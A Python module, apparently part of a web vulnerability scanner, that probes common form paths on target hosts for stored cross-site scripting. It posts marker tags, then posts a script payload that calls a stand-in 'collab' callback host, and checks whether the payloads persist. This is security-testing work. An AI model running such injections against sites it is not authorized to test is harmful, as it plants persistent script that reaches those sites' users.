
"""Stored XSS Detection — inject → re-fetch → verify."""

import asyncio
import uuid
from urllib.parse import urlparse

from core.client import AsyncNetworkEngine
from core.ui import w


class StoredXSSHunter:
    """Detect stored XSS by injecting payload then re-fetching the page."""

    FORMS = [
        "/login", "/register", "/signup", "/contact", "/feedback",
        "/comment", "/post", "/profile", "/settings", "/review",
    ]

    def __init__(self, target_urls: list[str], engine: AsyncNetworkEngine,
                 session_manager=None, allow_post: bool = True):
        self.target_urls = target_urls
        self.engine = engine
        self.session_manager = session_manager
        self.allow_post = allow_post
        
    async def run(self) -> list[dict]:
        findings = []

        async def _test_form(form_url: str) -> list[dict]:
            parsed_form = urlparse(form_url)
            base = f"{parsed_form.scheme}://{parsed_form.netloc}"
            form_findings = []

            if not self.allow_post:
                # Mode tanpa POST (mode 3 = cari path celah tanpa inject):
                # GET-probe path form saja, tanpa payload. Status yang
                # menandakan route ada: 2xx/3xx/401/403. 404/410 = tidak ada.
                r = await self.engine.ahttp_send(form_url, timeout=10,
                                                 state_context=self.session_manager)
                if r.get("status") in (200, 201, 301, 302, 303, 307, 308, 401, 403):
                    form_findings.append({
                        "type": "form_endpoint",
                        "title": "Input Form Endpoint",
                        "url": form_url,
                        "detail": (f"GET {r['status']} — path exists; "
                                   "injection testing skipped (POST only mode 4)"),
                        "confidence": "confirmed",
                        "status": r["status"],
                    })
                return form_findings

            tag = f"xsstest_{uuid.uuid4().hex[:6]}"

            # Inject stealth payload
            payload = f'<noscript>{tag}</noscript>'
            r = await self.engine.ahttp_send(form_url, method="POST",
                      data={"name": payload, "message": payload, "email": "test@test.com"},
                      timeout=10, state_context=self.session_manager)
            if r.get("status") in (200, 302, 301):
                # Re-fetch to check if stored
                r2 = await self.engine.ahttp_send(form_url, timeout=10, state_context=self.session_manager)
                r_base = await self.engine.ahttp_send(base, timeout=10, state_context=self.session_manager)
                body = (r2.get("body", "") or "") + (r_base.get("body", "") or "")
                if tag in body:
                    form_findings.append({
                        "type": "stored_input",
                        "title": "Stored Input Found",
                        "url": form_url,
                        "detail": f"Tag: {tag} persisted in response",
                        "confidence": "confirmed",
                    })

                    # Try real XSS payload
                    xss_payload = f'<script>fetch("http://collab/{tag}")</script>'
                    await self.engine.ahttp_send(form_url, method="POST",
                          data={"name": xss_payload, "message": xss_payload},
                          timeout=10, state_context=self.session_manager)
                    r3 = await self.engine.ahttp_send(form_url, timeout=10, state_context=self.session_manager)
                    r3_base = await self.engine.ahttp_send(base, timeout=10, state_context=self.session_manager)
                    body3 = (r3.get("body", "") or "") + (r3_base.get("body", "") or "")
                    if xss_payload[:30] in body3:
                        form_findings.append({
                            "type": "stored_xss",
                            "title": "Stored XSS",
                            "url": form_url,
                            "detail": "XSS payload persisted. Use callback collab to confirm.",
                            "confidence": "suspected",
                        })
            return form_findings

        # Dedup form URL lintas target: 30 URL di host yang sama membangun
        # 11 form identik berkali-kali (330 coroutine → ≤11 unik/host) +
        # semaphore 10 — komentar "throttle" dulu tak ada kodenya, semuanya
        # langsung mengerumuni gate engine bersama modul lain.
        form_urls = []
        seen = set()
        for url in self.target_urls[:30]:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for form_path in self.FORMS:
                form_url = base + form_path
                if form_url not in seen:
                    seen.add(form_url)
                    form_urls.append(form_url)

        sem = asyncio.Semaphore(10)

        async def _limited(form_url: str) -> list[dict]:
            async with sem:
                return await _test_form(form_url)

        results = await asyncio.gather(
            *(_limited(u) for u in form_urls), return_exceptions=True)
        for res in results:
            if isinstance(res, list) and res:
                findings.extend(res)
            elif isinstance(res, BaseException):
                # Was silently dropped — crashed probes looked like "form not found".
                w(f"stored-xss probe crashed: "
                  f"{res.__class__.__name__}: {str(res)[:80]}")

        return findings
